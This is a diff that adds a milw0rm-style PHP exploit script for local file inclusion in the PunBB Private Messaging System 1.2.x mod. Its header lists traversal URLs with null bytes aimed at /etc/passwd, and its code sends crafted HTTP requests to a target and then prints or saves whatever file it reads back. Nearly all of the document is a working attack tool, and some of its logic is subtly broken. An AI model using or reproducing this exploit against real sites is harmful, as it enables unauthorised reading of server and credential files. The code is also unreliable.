@@ -1,0 +1,283 @@
+<?php
+
+error_reporting(0);
+ini_set("default_socket_timeout",5);
+
+
+
+
+/*
+   
+   
+    PunBB (Private Messaging System 1.2.x) Multiple LFI Exploit
+    -----------------------------------------------------------
+    by athos - staker[at]hotmail[dot]it
+    download mod http://www.punres.org/files.php?pid=52
+    download cms http://punbb.org
+    -----------------------------------------------------------
+    register_globals = 1
+    magic_quotes_gpc = 1
+    
+    Directory (files/include/pms)
+
+    functions_navlinks.php?pun_user[language]=../../../../../etc/passwd
+    profile_send.php?pun_user[language]=../../../../../etc/passwd
+    viewtopic_PM-link.php?pun_user[language]=../../../../../etc/passwd
+
+    ../../etc/passwd and nullbyte
+    
+
+
+    File (files/include/pms/functions_navlinks.php)
+    
+    1. <?php
+    2. 	require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
+    
+    $pun_user['language'] isn't declared :D you can include any file
+    
+    functions_navlinks.php?pun_user[language]=../../../etc/passwd%00
+    -------------------------------------------------------------------
+    
+    File (files/include/pms/header_new_messages.php)
+    
+    1. <?php
+    2. if(!$pun_user['is_guest'] && $pun_user['g_pm'] == 1 && $pun_config['o_pms_enabled'] ){
+    3. require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
+    
+    $pun_user['g_pm'] isn't declared
+    $pun_config['o_pms_enabled'] isn't declared
+    
+    header_new_messages.php?pun_user[g_pm]=1&pun_config[o_pms_enabled]=x&pun_user[language]=../etc/passd%00
+    
+    
+    -------------------------------------------------------------------
+    
+    File (files/include/pms/profile_send.php))
+    
+    1. <?php
+    2. require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
+    
+    $pun_user['language'] isn't declared
+    
+    profile_send.php?pun_user[language]=../../../../etc/passwd%00
+    
+    -------------------------------------------------------------------
+    
+    File (files/include/pms/viewtopic_PM-link.php)
+    
+    1. <?php
+    2. require PUN_ROOT.'lang/'.$pun_user['language'].'/pms.php';
+    
+    $pun_user['language'] isn't declared
+    
+    viewtopic_PM-link.php?pun_user[language]=../../../../etc/passwd%00
+    
+    -------------------------------------------------------------------
+    
+    
+    Usage:  php [punbb.php] [host/path] [mode]
+            php [punbb.php] [host/path] [save]
+            php [punbb.php] [host/path] [NULL]
+           
+   Example:
+            php punbb.php localhost/punbb save
+            php punbb.php localhost/punbb
+          
+                   
+    NOTE: Don't add me on MSN Messenger
+
+    
+    
+*/    
+
+$exploit = new Exploit;
+$domain = $argv[1];
+$mymode = $argv[2];
+
+$exploit->starting();
+$exploit->is_vulnerable($domain);
+$exploit->exploiting($domain,$mymode);
+
+ 
+
+class Exploit
+{
+  
+  function http_request($host,$data) 
+  {   
+   
+    if(!$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) 
+    {
+       echo "socket_create() error!\r\n";
+       exit;
+    }
+    if(!socket_set_option($socket,SOL_SOCKET,SO_BROADCAST,1))
+    { 
+      echo "socket_set_option() error!\r\n";
+      exit;
+    }
+    
+    if(!socket_connect($socket,$host,80))
+    {
+      echo "socket_connect() error!\r\n";
+      exit;
+    }
+    if(!socket_write($socket,$data,strlen($data)))
+    {
+      echo "socket_write() errror!\r\n";
+      exit;
+    }
+  
+    while($get = socket_read($socket,1024,PHP_NORMAL_READ)) 
+    { 
+      $content .= $get; 
+    }
+
+    socket_close($socket);
+  
+   
+   $array = array(
+                 'HTTP/1.1 404 Not Found',
+                 'HTTP/1.1 300 Multiple Choices',
+                 'HTTP/1.1 301 Moved Permanently',
+                 'HTTP/1.1 302 Found',
+                 'HTTP/1.1 304 Not Modified',
+                 'HTTP/1.1 400 Bad Request',
+                 'HTTP/1.1 401 Unauthorized',
+                 'HTTP/1.1 402 Payment Required',
+                 'HTTP/1.1 403 Forbidden',
+                 'HTTP/1.1 405 Method Not Allowed',
+                 'HTTP/1.1 406 Not Acceptable',
+                 'HTTP/1.1 407 Proxy Authentication Required',
+                 'HTTP/1.1 408 Request Timeout',
+                 'HTTP/1.1 409 Conflict',
+                 'HTTP/1.1 410 Gone',
+                 'HTTP/1.1 411 Length Required',
+                 'HTTP/1.1 412 Precondition Failed',
+                 'HTTP/1.1 413 Request Entity Too Large',
+                 'HTTP/1.1 414 Request-URI Too Long',
+                 'HTTP/1.1 415 Unsupported Media Type',
+                 'HTTP/1.1 416 Request Range Not Satisfiable',
+                 'HTTP/1.1 417 Expectation Failed',
+                 'HTTP/1.1 Retry With',
+                );
+                
+               
+    for($i=0;$i<=count($array);$i++)
+   
+    if(eregi($array[$i],$content)) 
+    {
+      return ("$array[$i]\r\n");
+      break;
+    } 
+    else 
+    {
+      return ("$content\r\n");
+      break;
+    }
+  }
+     
+  
+  function is_vulnerable($host)
+  {
+    $host = explode('/',$host);
+    
+    $header .= "GET /$host[1]/profile_send.php?pun_user[language]=%27 HTTP/1.1\r\n";
+    $header .= "Host: $host[0]\r\n";
+    $header .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
+    $header .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+    $header .= "Accept-Language: en-us,en;q=0.5\r\n";
+    $header .= "Accept-Encoding: gzip,deflate\r\n";
+    $header .= "Connection: close\r\n\r\n";
+    
+    if(stristr($this->http_request($host[0],$header),"\\'"))
+    {  
+      echo "[+] Magic Quotes GPC/Register Globals On!\n";
+      echo "[+] Exploit Failed!\n";
+      exit;
+    }
+    else
+    {
+      return false;
+    }
+  }
+  
+  function starting()
+  {
+   
+    global $argv;
+    
+    if(preg_match('/http://(.+?)$/',$argv[1]) or empty($argv[1]))
+    {
+    
+      echo "[+] PunBB (Private Messaging System 1.2.x) Multiple LFI Exploit\r\n";
+      echo "[+] by athos - staker[at]hotmail[dot]it\r\n";
+      echo "    -----------------------------------------------------------\r\n";
+      echo "[+] Usage: php $argv[0] [host/path] [mode]\r\n";
+      echo "[+] Usage: php $argv[0] [host/path] [save]\r\n";
+      echo "[+] Usage: php $argv[0] [host/path]        \r\n";
+      exit;
+    
+    }
+  }
+  
+  function exploiting($host,$mode)
+  {
+    
+    $host = explode('/',$host);
+    $i = 0;
+    
+    
+    echo "[+] Local File (ex: ../../etc/passwd%00)\r\n";
+    echo "[+] Local File: ";
+    
+    $file = stripslashes(trim(fgets(STDIN)));
+    
+    if(empty($file)) die("you fail");
+    
+    
+    $array = array (
+                    "functions_navlinks.php?pun_user[language]=$file",
+                    "profile_send.php?pun_user[language]=$file",
+                    "viewtopic_PM-link.php?pun_user[language]=$file",
+                    "header_new_messages.php?pun_user[g_pm]=1&pun_config[o_pms_enabled]=x&pun_user[language]=$file",
+                  ); 
+
+    $write .= "GET /$host[1]/files/include/pms/$array[$i] HTTP/1.1\r\n";
+    $write .= "Host: $host[0]\r\n";
+    $write .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
+    $write .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+    $write .= "Accept-Language: en-us,en;q=0.5\r\n";
+    $write .= "Accept-Encoding: gzip,deflate\r\n";
+    $write .= "Connection: close\r\n\r\n";
+    
+
+   
+    
+    if(stristr($this->http_request($host[0],$write),'No such file or directory in'))
+    {
+      $i++;
+    }
+    else
+    {
+      if($mode == "save") 
+      {
+   
+        $rand = rand(0,99999);
+        fclose(fwrite(fopen(getcwd().'/'.$rand.'.txt',"a+"),$this->http_request($host[0],$write)));
+        
+        echo "[+] File $rand Saved Successfully!\r\n";
+        echo "[+] Exploit Terminated!\r\n";
+        exit;
+      
+      }
+      else
+      {
+        echo $this->http_request($host[0],$write);
+        exit;
+      }
+    }
+  }
+}
+
+# milw0rm.com [2008-11-19]
